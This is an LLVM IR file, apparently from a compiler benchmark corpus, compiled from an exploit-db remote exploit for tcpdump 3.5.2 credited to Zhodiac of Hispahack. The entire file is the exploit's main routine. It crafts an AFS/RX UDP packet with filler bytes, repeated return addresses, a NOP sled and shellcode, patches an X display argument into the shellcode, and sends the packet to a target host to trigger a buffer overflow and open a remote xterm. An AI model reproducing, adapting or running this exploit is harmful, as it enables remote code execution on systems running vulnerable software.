; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20337.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_20337.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.rx_header = type { i32, i8*, i32 }
%struct.sockaddr = type { i32 }

@OFFSET = common dso_local global i32 0, align 4
@ADDR = common dso_local global i64 0, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [53 x i8] c"\0A!Hispahack Research Team (http://hispahack.ccc.de)\0A\00", align 1
@.str.1 = private unnamed_addr constant [57 x i8] c"Tcpdump 3.5.2 xploit by Zhodiac <zhodiac@softhome.net>\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"Usage: %s <host> <display> [offset]\0A\00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c"Using return addr: %#x\0A\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@FS_RX_DPORT = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"socket()\00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@FS_RX_SPORT = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"bind()\00", align 1
@RX_PACKET_TYPE_DATA = common dso_local global i32 0, align 4
@RX_CLIENT_INITIATED = common dso_local global i32 0, align 4
@AFS_CALL = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [5 x i8] c"1 0\0A\00", align 1
@NUM_ADDR = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@NUM_NOP = common dso_local global i32 0, align 4
@shellcode = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [4 x i8] c" 1\0A\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"send()\00", align 1
@.str.9 = private unnamed_addr constant [59 x i8] c"Packet with Overflow sent, now wait for the xterm!!!! :)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 8
  %7 = alloca %struct.sockaddr_in, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca [4048 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca %struct.rx_header*, align 8
  %14 = alloca i64*, align 8
  %15 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = load i32, i32* @OFFSET, align 4
  store i32 %16, i32* %10, align 4
  %17 = load i64, i64* @ADDR, align 8
  store i64 %17, i64* %15, align 8
  %18 = load i32, i32* @stderr, align 4
  %19 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* @stderr, align 4
  %21 = call i32 (i32, i8*, ...) @fprintf(i32 %20, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp slt i32 %22, 3
  br i1 %23, label %24, label %30

24:                                               ; preds = %2
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i8* %27)
  %29 = call i32 @exit(i32 -1) #3
  unreachable

30:                                               ; preds = %2
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 4
  br i1 %32, label %33, label %38

33:                                               ; preds = %30
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 3
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36)
  store i32 %37, i32* %10, align 4
  br label %38

38:                                               ; preds = %33, %30
  %39 = load i32, i32* %10, align 4
  %40 = sext i32 %39 to i64
  %41 = load i64, i64* %15, align 8
  %42 = add nsw i64 %41, %40
  store i64 %42, i64* %15, align 8
  %43 = load i32, i32* @stderr, align 4
  %44 = load i64, i64* %15, align 8
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %43, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0), i64 %44)
  %46 = load i8*, i8** @AF_INET, align 8
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i8* %46, i8** %47, align 8
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call i32 @resolve(i8* %50)
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %53 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %52, i32 0, i32 0
  store i32 %51, i32* %53, align 8
  %54 = load i32, i32* @FS_RX_DPORT, align 4
  %55 = call i8* @htons(i32 %54)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i8* %55, i8** %56, align 8
  %57 = load i8*, i8** @AF_INET, align 8
  %58 = load i32, i32* @SOCK_DGRAM, align 4
  %59 = call i32 @socket(i8* %57, i32 %58, i32 0)
  store i32 %59, i32* %8, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %64

61:                                               ; preds = %38
  %62 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %63 = call i32 @exit(i32 -1) #3
  unreachable

64:                                               ; preds = %38
  %65 = load i8*, i8** @AF_INET, align 8
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i8* %65, i8** %66, align 8
  %67 = load i32, i32* @INADDR_ANY, align 4
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  %69 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %68, i32 0, i32 0
  store i32 %67, i32* %69, align 8
  %70 = load i32, i32* @FS_RX_SPORT, align 4
  %71 = call i8* @htons(i32 %70)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i8* %71, i8** %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %75 = call i64 @bind(i32 %73, %struct.sockaddr* %74, i32 24)
  %76 = icmp slt i64 %75, 0
  br i1 %76, label %77, label %80

77:                                               ; preds = %64
  %78 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %79 = call i32 @exit(i32 -1) #3
  unreachable

80:                                               ; preds = %64
  %81 = getelementptr inbounds [4048 x i8], [4048 x i8]* %11, i64 0, i64 0
  %82 = call i32 @memset(i8* %81, i8 signext 0, i32 4048)
  %83 = getelementptr inbounds [4048 x i8], [4048 x i8]* %11, i64 0, i64 0
  %84 = bitcast i8* %83 to %struct.rx_header*
  store %struct.rx_header* %84, %struct.rx_header** %13, align 8
  %85 = load i32, i32* @RX_PACKET_TYPE_DATA, align 4
  %86 = load %struct.rx_header*, %struct.rx_header** %13, align 8
  %87 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %86, i32 0, i32 2
  store i32 %85, i32* %87, align 8
  %88 = call i8* @htonl(i32 1)
  %89 = load %struct.rx_header*, %struct.rx_header** %13, align 8
  %90 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %89, i32 0, i32 1
  store i8* %88, i8** %90, align 8
  %91 = load i32, i32* @RX_CLIENT_INITIATED, align 4
  %92 = load %struct.rx_header*, %struct.rx_header** %13, align 8
  %93 = getelementptr inbounds %struct.rx_header, %struct.rx_header* %92, i32 0, i32 0
  store i32 %91, i32* %93, align 8
  %94 = getelementptr inbounds [4048 x i8], [4048 x i8]* %11, i64 0, i64 0
  %95 = getelementptr inbounds i8, i8* %94, i64 24
  %96 = bitcast i8* %95 to i64*
  store i64* %96, i64** %14, align 8
  %97 = load i32, i32* @AFS_CALL, align 4
  %98 = call i8* @htonl(i32 %97)
  %99 = ptrtoint i8* %98 to i64
  %100 = load i64*, i64** %14, align 8
  %101 = getelementptr inbounds i64, i64* %100, i32 1
  store i64* %101, i64** %14, align 8
  store i64 %99, i64* %100, align 8
  %102 = call i8* @htonl(i32 1)
  %103 = ptrtoint i8* %102 to i64
  %104 = load i64*, i64** %14, align 8
  %105 = getelementptr inbounds i64, i64* %104, i32 1
  store i64* %105, i64** %14, align 8
  store i64 %103, i64* %104, align 8
  %106 = call i8* @htonl(i32 2)
  %107 = ptrtoint i8* %106 to i64
  %108 = load i64*, i64** %14, align 8
  %109 = getelementptr inbounds i64, i64* %108, i32 1
  store i64* %109, i64** %14, align 8
  store i64 %107, i64* %108, align 8
  %110 = call i8* @htonl(i32 3)
  %111 = ptrtoint i8* %110 to i64
  %112 = load i64*, i64** %14, align 8
  %113 = getelementptr inbounds i64, i64* %112, i32 1
  store i64* %113, i64** %14, align 8
  store i64 %111, i64* %112, align 8
  %114 = call i8* @htonl(i32 420)
  %115 = ptrtoint i8* %114 to i64
  %116 = load i64*, i64** %14, align 8
  %117 = getelementptr inbounds i64, i64* %116, i32 1
  store i64* %117, i64** %14, align 8
  store i64 %115, i64* %116, align 8
  %118 = load i64*, i64** %14, align 8
  %119 = bitcast i64* %118 to i8*
  store i8* %119, i8** %12, align 8
  %120 = load i8*, i8** %12, align 8
  %121 = call i32 @sprintf(i8* %120, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0))
  %122 = load i8*, i8** %12, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 4
  store i8* %123, i8** %12, align 8
  %124 = load i8*, i8** %12, align 8
  %125 = call i32 @memset(i8* %124, i8 signext 65, i32 120)
  %126 = load i8*, i8** %12, align 8
  %127 = getelementptr inbounds i8, i8* %126, i64 120
  store i8* %127, i8** %12, align 8
  %128 = load i8*, i8** %12, align 8
  %129 = bitcast i8* %128 to i64*
  store i64* %129, i64** %14, align 8
  store i32 0, i32* %9, align 4
  br label %130

130:                                              ; preds = %138, %80
  %131 = load i32, i32* %9, align 4
  %132 = load i32, i32* @NUM_ADDR, align 4
  %133 = icmp slt i32 %131, %132
  br i1 %133, label %134, label %141

134:                                              ; preds = %130
  %135 = load i64, i64* %15, align 8
  %136 = load i64*, i64** %14, align 8
  %137 = getelementptr inbounds i64, i64* %136, i32 1
  store i64* %137, i64** %14, align 8
  store i64 %135, i64* %136, align 8
  br label %138

138:                                              ; preds = %134
  %139 = load i32, i32* %9, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %9, align 4
  br label %130

141:                                              ; preds = %130
  %142 = load i64*, i64** %14, align 8
  %143 = bitcast i64* %142 to i8*
  store i8* %143, i8** %12, align 8
  %144 = load i8*, i8** %12, align 8
  %145 = load i8, i8* @NOP, align 1
  %146 = load i32, i32* @NUM_NOP, align 4
  %147 = call i32 @memset(i8* %144, i8 signext %145, i32 %146)
  %148 = load i32, i32* @NUM_NOP, align 4
  %149 = load i8*, i8** %12, align 8
  %150 = sext i32 %148 to i64
  %151 = getelementptr inbounds i8, i8* %149, i64 %150
  store i8* %151, i8** %12, align 8
  %152 = load i8**, i8*** %5, align 8
  %153 = getelementptr inbounds i8*, i8** %152, i64 2
  %154 = load i8*, i8** %153, align 8
  %155 = call i64 @strlen(i8* %154)
  %156 = add nsw i64 46, %155
  %157 = trunc i64 %156 to i8
  %158 = load i8*, i8** @shellcode, align 8
  %159 = getelementptr inbounds i8, i8* %158, i64 30
  store i8 %157, i8* %159, align 1
  %160 = load i8*, i8** %12, align 8
  %161 = load i8*, i8** @shellcode, align 8
  %162 = load i8*, i8** @shellcode, align 8
  %163 = call i64 @strlen(i8* %162)
  %164 = call i32 @memcpy(i8* %160, i8* %161, i64 %163)
  %165 = load i8*, i8** @shellcode, align 8
  %166 = call i64 @strlen(i8* %165)
  %167 = load i8*, i8** %12, align 8
  %168 = getelementptr inbounds i8, i8* %167, i64 %166
  store i8* %168, i8** %12, align 8
  %169 = load i8*, i8** %12, align 8
  %170 = load i8**, i8*** %5, align 8
  %171 = getelementptr inbounds i8*, i8** %170, i64 2
  %172 = load i8*, i8** %171, align 8
  %173 = load i8**, i8*** %5, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 2
  %175 = load i8*, i8** %174, align 8
  %176 = call i64 @strlen(i8* %175)
  %177 = call i32 @memcpy(i8* %169, i8* %172, i64 %176)
  %178 = load i8**, i8*** %5, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 2
  %180 = load i8*, i8** %179, align 8
  %181 = call i64 @strlen(i8* %180)
  %182 = load i8*, i8** %12, align 8
  %183 = getelementptr inbounds i8, i8* %182, i64 %181
  store i8* %183, i8** %12, align 8
  %184 = load i8*, i8** %12, align 8
  %185 = call i32 @sprintf(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.7, i64 0, i64 0))
  %186 = load i32, i32* %8, align 4
  %187 = getelementptr inbounds [4048 x i8], [4048 x i8]* %11, i64 0, i64 0
  %188 = call i32 @sendto(i32 %186, i8* %187, i32 520, i32 0, %struct.sockaddr_in* %6, i32 24)
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %190, label %193

190:                                              ; preds = %141
  %191 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0))
  %192 = call i32 @exit(i32 -1) #3
  unreachable

193:                                              ; preds = %141
  %194 = load i32, i32* @stderr, align 4
  %195 = call i32 (i32, i8*, ...) @fprintf(i32 %194, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.9, i64 0, i64 0))
  %196 = load i32, i32* %8, align 4
  %197 = call i32 @close(i32 %196)
  ret i32 0
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @printf(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @resolve(i8*) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i8* @htonl(i32) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i64) #1

declare dso_local i32 @sendto(i32, i8*, i32, i32, %struct.sockaddr_in*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
